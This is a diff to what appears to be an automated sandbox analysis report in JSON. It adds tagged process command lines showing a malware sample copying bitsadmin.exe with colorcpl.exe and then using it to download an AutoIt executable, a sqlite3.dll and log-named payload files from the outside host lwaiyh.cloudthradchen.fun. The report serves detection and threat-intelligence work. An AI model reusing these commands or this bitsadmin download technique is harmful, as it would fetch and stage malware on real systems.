@@ -224,6 +224,24 @@
           "signatures": {}
         },
         "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "cmd /V /C \"echo C:\\W63770416524\\>C:\\Users\\Public\\po\"&& exit",
+                "colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe",
+                "C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?57261752224628739 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.exe\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?55863631366632969 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.log\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?50209571596639078 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3dbl.log\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?48963051144664142 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3dbu.log\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?48710006293678025 \"C:\\W63770416524\\sqlite3.dll\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?39711079126693642 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3db.temp\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?37437974563613970 \"C:\\W63770416524\\boss.log\"",
+                "cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r1.log\"&& exit",
+                "cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r.log\"&& exit"
+              ]
+            }
+          },
           "network": {
             "dynamic": {
               "domain": [
@@ -325,6 +343,68 @@
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?37437974563613970 \"C:\\W63770416524\\boss.log\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?39711079126693642 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3db.temp\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?48710006293678025 \"C:\\W63770416524\\sqlite3.dll\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?48963051144664142 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3dbu.log\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?50209571596639078 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3dbl.log\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?55863631366632969 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.log\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?57261752224628739 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.exe\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "cmd /V /C \"echo C:\\W63770416524\\>C:\\Users\\Public\\po\"&& exit"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r.log\"&& exit"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r1.log\"&& exit"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe"
+        }
+      ],
       "network.dynamic.domain": [
         {
           "heur_id": 13,
